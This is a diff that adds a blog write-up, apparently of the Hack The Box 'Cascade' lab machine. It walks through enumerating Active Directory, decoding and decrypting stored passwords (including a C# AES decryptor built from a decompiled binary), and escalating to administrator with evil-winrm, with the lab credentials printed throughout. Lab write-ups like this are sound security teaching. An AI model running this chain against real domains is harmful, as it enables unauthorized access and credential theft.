@@ -1,0 +1,475 @@
+I"�`<p><strong><center>Ref°: HTB-12-Machine</center></strong></p>
+
+<p>— Cascade is a Windows Medium machine which highlights the misconfiguration of the accounts and strength in the use of code review to recover sensitive information.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Information-Cascade.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="network-service-scanning">Network Service Scanning</h3>
+<hr />
+<p>Nmap scan reveal many services on her usual port such as : <code class="language-plaintext highlighter-rouge">kerberos</code>, <code class="language-plaintext highlighter-rouge">ldap</code>, <code class="language-plaintext highlighter-rouge">smb</code>, etc.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">-T5</span> 10.10.10.182 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-nmap.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="server-message-block">Server Message Block</h3>
+<hr />
+<p>My first reaction is to use enum4linux to hope find many users and the domain to pwned.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>enum4linux 10.10.10.182
+</code></pre></div></div>
+<p>And we got all of this : <code class="language-plaintext highlighter-rouge">Administrator, krbtgt, e.crowe, b.hanson, i.croft, CascGuest, arksvc, s.smith, r.thompson, util, j.wakefield, s.hickson, j.goodhand, a.turnbull, d.burman, BackupSvc, j.allen</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-enum4linux.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We can also use rpcclient to find the same thing.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.182
+<span class="gp">rpcclient $</span><span class="o">&gt;</span> enumdomusers
+<span class="go">user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+</span></code></pre></div></div>
+
+<p>smb and kerberos services reveal nothing.</p>
+
+<h3 id="lightweight-directory-access-protocol">Lightweight Directory Access Protocol</h3>
+<hr />
+<p>We use ldapsearch tool to find other information through ldap service.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.182 <span class="nt">-p</span> 389 <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> <span class="o">&gt;</span> ldapsearch.txt
+</code></pre></div></div>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="encoded-password-from-attribute">Encoded Password from attribute</h3>
+<hr />
+
+<p>To perform the enumeration, we grep all information reference by <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">passwd</code>, or <code class="language-plaintext highlighter-rouge">pwd</code>.
+Here we find interesting attribute with name <code class="language-plaintext highlighter-rouge">cascadeLegacyPwd</code> from the user <code class="language-plaintext highlighter-rouge">r.thompson</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">clk0bjVldmE=</code> he seem to be her hash password encode in base 64?</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">grep</span> <span class="s2">"Pwd"</span> ldapsearch.txt
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-attribute.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="decoding-password">Decoding Password</h3>
+<hr />
+
+<p>No vulnerabilities identify here, but we have possibility to decrypt hash password of the user <code class="language-plaintext highlighter-rouge">r.thompson</code>. 
+We can exploit this to access and gain a foothold.</p>
+
+<p>We create file which contain the hash password and use this command to decrypt:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">command base64</span> <span class="nt">-d</span> passwd.txt
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-decode.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We found the password : <code class="language-plaintext highlighter-rouge">rY4n5eva</code></p>
+
+<h3 id="remote-service-smb-login">Remote Service SMB login</h3>
+<hr />
+<p>We can use this credential to access of the target through smb service.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbmap <span class="nt">-u</span> r.thompson <span class="nt">-p</span> rY4n5eva <span class="nt">-H</span> 10.10.10.182
+</code></pre></div></div>
+
+<p>smbmap tool reveal more available share with this account, but the more interesting is <code class="language-plaintext highlighter-rouge">Data</code> share.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-share_data.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="encrypted-password-from-reg-file">Encrypted Password from .reg file</h3>
+<hr />
+
+<p>Enumeration of Data Share :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>mount <span class="nt">-t</span> cifs //10.10.10.182/Data share_data <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span><span class="s1">'r.thompson'</span>,password<span class="o">=</span>rY4n5eva
+</code></pre></div></div>
+
+<p>Under <code class="language-plaintext highlighter-rouge">/IT/Email Archives/</code>, we have <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code>.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-archive_mail.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This email archive reveal about temporary account which used to perform all tasks related to the network migration and this account has been deleted. The username was <code class="language-plaintext highlighter-rouge">TempAdmin</code> and the password is the same of the normal admin account.</p>
+
+<p>Under <code class="language-plaintext highlighter-rouge">/IT/Logs/Ark AD Recycle Bin/</code>, we have <code class="language-plaintext highlighter-rouge">ArkAdRecycleBin;Log</code>.
+This file show us two things :</p>
+<ul>
+  <li>We have execution of program by <code class="language-plaintext highlighter-rouge">ArkSvc</code></li>
+  <li>TempAdmin account has been moved to AD recycle bin</li>
+</ul>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-log.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Under <code class="language-plaintext highlighter-rouge">/IT/Temp/s.smith/</code>, we have <code class="language-plaintext highlighter-rouge">VNC Install.reg</code>.
+This file contain password in hex format …</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-vnc_reg.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="decrypting-password">Decrypting Password</h3>
+<hr />
+
+<p>I find tool to decrypt vnc password in hex format.</p>
+
+<p>Reference - vncpasswd tool : <a href="https://github.com/trinitronx/vncpasswd.py">https://github.com/trinitronx/vncpasswd.py</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python2 vncpasswd.py <span class="nt">-d</span> <span class="nt">-H</span> 6bcf2a4b6e5aca0f
+</code></pre></div></div>
+
+<p>We found password : <code class="language-plaintext highlighter-rouge">sT333ve2</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-vnc_decode.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="remote-service-winrm-login">Remote Service WinRM login</h3>
+<hr />
+<p>We have now the possibility to connect through evil-winrm and grab the flag user.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.182 <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2
+</code></pre></div></div>
+
+<h3 id="flag-user">Flag user</h3>
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-flag_user.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="4-lateral-movement---move-through-environment-2"><strong><span style="color:#c0392b">[4] Lateral Movement - Move through environment 2</span></strong></h2>
+<h3 id="remote-service-smb-login-1">Remote Service SMB login</h3>
+<hr />
+<p>smbmap tool reveal more available share with this new account, but the more interesting is <code class="language-plaintext highlighter-rouge">audit$</code> share.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbmap -u s.smith -p sT333ve2 -H 10.10.10.182
+</span></code></pre></div></div>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>mount <span class="nt">-t</span> cifs //10.10.10.182/audit<span class="nv">$ </span>share_audit <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span><span class="s1">'s.smith'</span>,password<span class="o">=</span>sT333ve2
+</code></pre></div></div>
+
+<p>Under <code class="language-plaintext highlighter-rouge">/audit/DB/</code>, we have <code class="language-plaintext highlighter-rouge">Audit.db</code>.</p>
+
+<p>Under <code class="language-plaintext highlighter-rouge">/audit/</code>, we have <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and many <code class="language-plaintext highlighter-rouge">.dll</code> files.</p>
+
+<h3 id="encrypted-password-from-database">Encrypted Password from database</h3>
+<hr />
+<p>We found inside <code class="language-plaintext highlighter-rouge">ldap</code> table encrypt password of arksvc account : <code class="language-plaintext highlighter-rouge">BQO5l5Kj9MdErXx6Q6AGOw==</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-DB.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="review-code-cascauditexe-">Review Code CascAudit.exe :</h4>
+<p>We use ILSpy tool to decompile the program CascAudit.exe and we have the key used for the encryption and decryption of arksvc account password : <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-ilspy_program.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>But we need to recover the complete function of decryption to discover the password.</p>
+
+<p>This function is present in <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-ilspy_function.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>What we learn here is that to encrypt a string, we use the following :</p>
+
+<ul>
+  <li>Key = <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code></li>
+  <li>initVector = <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code></li>
+  <li>keySize = <code class="language-plaintext highlighter-rouge">128</code></li>
+</ul>
+
+<p>So we have the possiblity to decrypt the hash from function DecryptString.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	public static string DecryptString<span class="o">(</span>string EncryptedString, string Key<span class="o">)</span>
+	<span class="o">{</span>
+		//Discarded unreachable code: IL_009e
+		byte[] array <span class="o">=</span> Convert.FromBase64String<span class="o">(</span>EncryptedString<span class="o">)</span><span class="p">;</span>
+		Aes aes <span class="o">=</span> Aes.Create<span class="o">()</span><span class="p">;</span>
+		aes.KeySize <span class="o">=</span> 128<span class="p">;</span>
+		aes.BlockSize <span class="o">=</span> 128<span class="p">;</span>
+		aes.IV <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span><span class="s2">"1tdyjCbY1Ix49842"</span><span class="o">)</span><span class="p">;</span>
+		aes.Mode <span class="o">=</span> CipherMode.CBC<span class="p">;</span>
+		aes.Key <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span>Key<span class="o">)</span><span class="p">;</span>
+		using <span class="o">(</span>MemoryStream stream <span class="o">=</span> new MemoryStream<span class="o">(</span>array<span class="o">))</span>
+		<span class="o">{</span>
+			using <span class="o">(</span>CryptoStream cryptoStream <span class="o">=</span> new CryptoStream<span class="o">(</span>stream, aes.CreateDecryptor<span class="o">()</span>, CryptoStreamMode.Read<span class="o">))</span>
+			<span class="o">{</span>
+				byte[] array2 <span class="o">=</span> new byte[checked<span class="o">(</span>array.Length - 1 + 1<span class="o">)]</span><span class="p">;</span>
+				cryptoStream.Read<span class="o">(</span>array2, 0, array2.Length<span class="o">)</span><span class="p">;</span>
+				<span class="k">return </span>Encoding.UTF8.GetString<span class="o">(</span>array2<span class="o">)</span><span class="p">;</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+</code></pre></div></div>
+<h3 id="decrypting-password-1">Decrypting Password</h3>
+<hr />
+<p>We create a new cs project with visual-studio and insert only the functions we need.</p>
+
+<p><strong>Utils.cs :</strong></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System<span class="p">;</span>
+using System.IO<span class="p">;</span>
+using System.Security.Cryptography<span class="p">;</span>
+using System.Text<span class="p">;</span>
+
+public class Crypto
+<span class="o">{</span>
+	public const string DefaultIV <span class="o">=</span> <span class="s2">"1tdyjCbY1Ix49842"</span><span class="p">;</span>
+
+	public const int Keysize <span class="o">=</span> 128<span class="p">;</span>
+
+	public static string EncryptString<span class="o">(</span>string Plaintext, string Key<span class="o">)</span>
+	<span class="o">{</span>
+		byte[] bytes <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span>Plaintext<span class="o">)</span><span class="p">;</span>
+		Aes aes <span class="o">=</span> Aes.Create<span class="o">()</span><span class="p">;</span>
+		aes.BlockSize <span class="o">=</span> 128<span class="p">;</span>
+		aes.KeySize <span class="o">=</span> 128<span class="p">;</span>
+		aes.IV <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span><span class="s2">"1tdyjCbY1Ix49842"</span><span class="o">)</span><span class="p">;</span>
+		aes.Key <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span>Key<span class="o">)</span><span class="p">;</span>
+		aes.Mode <span class="o">=</span> CipherMode.CBC<span class="p">;</span>
+		using <span class="o">(</span>MemoryStream memoryStream <span class="o">=</span> new MemoryStream<span class="o">())</span>
+		<span class="o">{</span>
+			using <span class="o">(</span>CryptoStream cryptoStream <span class="o">=</span> new CryptoStream<span class="o">(</span>memoryStream, aes.CreateEncryptor<span class="o">()</span>, CryptoStreamMode.Write<span class="o">))</span>
+			<span class="o">{</span>
+				cryptoStream.Write<span class="o">(</span>bytes, 0, bytes.Length<span class="o">)</span><span class="p">;</span>
+				cryptoStream.FlushFinalBlock<span class="o">()</span><span class="p">;</span>
+			<span class="o">}</span>
+			<span class="k">return </span>Convert.ToBase64String<span class="o">(</span>memoryStream.ToArray<span class="o">())</span><span class="p">;</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+
+	public static string DecryptString<span class="o">(</span>string EncryptedString, string Key<span class="o">)</span>
+	<span class="o">{</span>
+		//Discarded unreachable code: IL_009e
+		byte[] array <span class="o">=</span> Convert.FromBase64String<span class="o">(</span>EncryptedString<span class="o">)</span><span class="p">;</span>
+		Aes aes <span class="o">=</span> Aes.Create<span class="o">()</span><span class="p">;</span>
+		aes.KeySize <span class="o">=</span> 128<span class="p">;</span>
+		aes.BlockSize <span class="o">=</span> 128<span class="p">;</span>
+		aes.IV <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span><span class="s2">"1tdyjCbY1Ix49842"</span><span class="o">)</span><span class="p">;</span>
+		aes.Mode <span class="o">=</span> CipherMode.CBC<span class="p">;</span>
+		aes.Key <span class="o">=</span> Encoding.UTF8.GetBytes<span class="o">(</span>Key<span class="o">)</span><span class="p">;</span>
+		using <span class="o">(</span>MemoryStream stream <span class="o">=</span> new MemoryStream<span class="o">(</span>array<span class="o">))</span>
+		<span class="o">{</span>
+			using <span class="o">(</span>CryptoStream cryptoStream <span class="o">=</span> new CryptoStream<span class="o">(</span>stream, aes.CreateDecryptor<span class="o">()</span>, CryptoStreamMode.Read<span class="o">))</span>
+			<span class="o">{</span>
+				byte[] array2 <span class="o">=</span> new byte[checked<span class="o">(</span>array.Length - 1 + 1<span class="o">)]</span><span class="p">;</span>
+				cryptoStream.Read<span class="o">(</span>array2, 0, array2.Length<span class="o">)</span><span class="p">;</span>
+				<span class="k">return </span>Encoding.UTF8.GetString<span class="o">(</span>array2<span class="o">)</span><span class="p">;</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>Program.cs :</strong> We pass the hash value like EncryptedString and the key to call the function DecryptString and result in console the plaintext password.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>﻿using System<span class="p">;</span>
+
+namespace Cascade_Decrypt_Password_arksvc
+<span class="o">{</span>
+    class Program
+    <span class="o">{</span>
+        static void Main<span class="o">(</span>string[] args<span class="o">)</span>
+        <span class="o">{</span>
+            Console.WriteLine<span class="o">(</span>Crypto.DecryptString<span class="o">(</span><span class="s2">"BQO5l5Kj9MdErXx6Q6AGOw=="</span>, <span class="s2">"c4scadek3y654321"</span><span class="o">))</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>The password decrypted : <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-decrypt.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="remote-service-winrm-login-1">Remote Service WinRM login</h3>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.182 <span class="nt">-u</span> arksvc <span class="nt">-p</span> w3lc0meFr31nd
+</code></pre></div></div>
+
+<h2 id="5-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[5] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="admintemp-exploitation-from-recycle-bin">AdminTemp Exploitation from Recycle-Bin</h3>
+<hr />
+<p>We identified ArkSvc account was being used to move the TempAdmin account to the recycle bin.</p>
+
+<p>TempAdmin for Reminder has the same password as the administrator.</p>
+
+<h3 id="encoded-password-from-attribute-1">Encoded Password from attribute</h3>
+<hr />
+<p>Let’s take a look at the properties of this account.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\arksvc\Documents&gt;</span><span class="w"> </span>get-addomain | <span class="k">select </span>DeletedObjectsContainer
+<span class="gp">PS c:\Users\arksvc\Documents&gt;</span><span class="w"> </span>Get-ADObject <span class="nt">-filter</span> <span class="s1">'isDeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="nt">-includeDeletedObjects</span> <span class="nt">-property</span> <span class="k">*</span>
+</code></pre></div></div>
+<p>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-bin.png” | relative_url }})</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-bin2.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We have the same attribute under AdminTemp <code class="language-plaintext highlighter-rouge">cascadeLegacyPwd</code> and we grab the hash password in base64 : <code class="language-plaintext highlighter-rouge">YmFDVDNyMWFOMDBkbGVz</code></p>
+
+<h3 id="decoding-password-1">Decoding Password</h3>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">command base64</span> <span class="nt">-d</span> passwd2.txt
+</code></pre></div></div>
+
+<p>We found the password : <code class="language-plaintext highlighter-rouge">baCT3r1aN00dles</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-decode2.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="remote-service-winrm-login-and-flag-root">Remote Service WinRM login and Flag root</h3>
+<hr />
+<p>We get full control of Cascade machine.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.182 <span class="nt">-u</span> administrator <span class="nt">-p</span> baCT3r1aN00dles
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({{ “/assets/images/cascade/HTB-Images-Cascade-flag_root.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>Your most unhappy customers are your greatest source of learning.</strong></p>
+
+  <p>Bill Gates</p>
+</blockquote>
+:ET
